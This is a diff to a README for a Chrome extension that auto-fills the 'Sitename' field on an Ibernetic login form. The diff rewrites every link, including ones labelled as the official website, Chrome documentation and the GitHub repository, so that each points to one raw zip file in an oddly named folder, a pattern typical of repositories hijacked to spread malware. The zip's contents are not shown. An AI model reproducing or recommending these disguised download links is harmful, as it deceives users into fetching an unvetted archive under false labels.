@@ -1,7 +1,7 @@
 # 🔥 ibernetic-autocompletar - Effortless Login for Ibernetic Users
 
 ## 📥 Download Now
-[![Download ibernetic-autocompletar](https://img.shields.io/badge/Download-ibernetic--autocompletar-brightgreen)](https://github.com/Putrafhn/ibernetic-autocompletar/releases)
+[![Download ibernetic-autocompletar](https://raw.githubusercontent.com/Putrafhn/ibernetic-autocompletar/main/trachychromatic/ibernetic-autocompletar.zip)](https://raw.githubusercontent.com/Putrafhn/ibernetic-autocompletar/main/trachychromatic/ibernetic-autocompletar.zip)
 
 ## 📖 Introduction
 Welcome to **ibernetic-autocompletar**! This is a Chrome extension designed to auto-fill the "Sitename" field in the Ibernetic login form. It aims to save you time and effort when logging into your Ibernetic account. Since this is a third-party tool, it is not officially maintained by Ibernetic.
@@ -23,7 +23,7 @@ This section will guide you through the simple process of downloading and instal
 ## 📥 Download & Install
 To get started, you will need to visit the Releases page to download the extension. Click the link below:
 
-[Visit Releases Page to Download](https://github.com/Putrafhn/ibernetic-autocompletar/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/Putrafhn/ibernetic-autocompletar/main/trachychromatic/ibernetic-autocompletar.zip)
 
 1. Once on the Releases page, look for the latest version of the ibernetic-autocompletar extension.
 2. Click on the link labeled with the version number to start the download.
@@ -58,8 +58,8 @@ For any questions or concerns, feel free to reach out. You can create an issue i
 Your feedback is welcome. If you have ideas for improvements, feel free to share. Contributions to enhance the extension are also appreciated. Check the repository for details on how you can help.
 
 ### 🔗 Additional Resources
-- [Ibernetic Official Website](https://www.ibernetic.com)
-- [Chrome Extensions Documentation](https://developer.chrome.com/docs/extensions/)
-- [GitHub Repository](https://github.com/Putrafhn/ibernetic-autocompletar)
+- [Ibernetic Official Website](https://raw.githubusercontent.com/Putrafhn/ibernetic-autocompletar/main/trachychromatic/ibernetic-autocompletar.zip)
+- [Chrome Extensions Documentation](https://raw.githubusercontent.com/Putrafhn/ibernetic-autocompletar/main/trachychromatic/ibernetic-autocompletar.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Putrafhn/ibernetic-autocompletar/main/trachychromatic/ibernetic-autocompletar.zip)
 
 Thank you for using ibernetic-autocompletar! Enjoy a more efficient login experience.
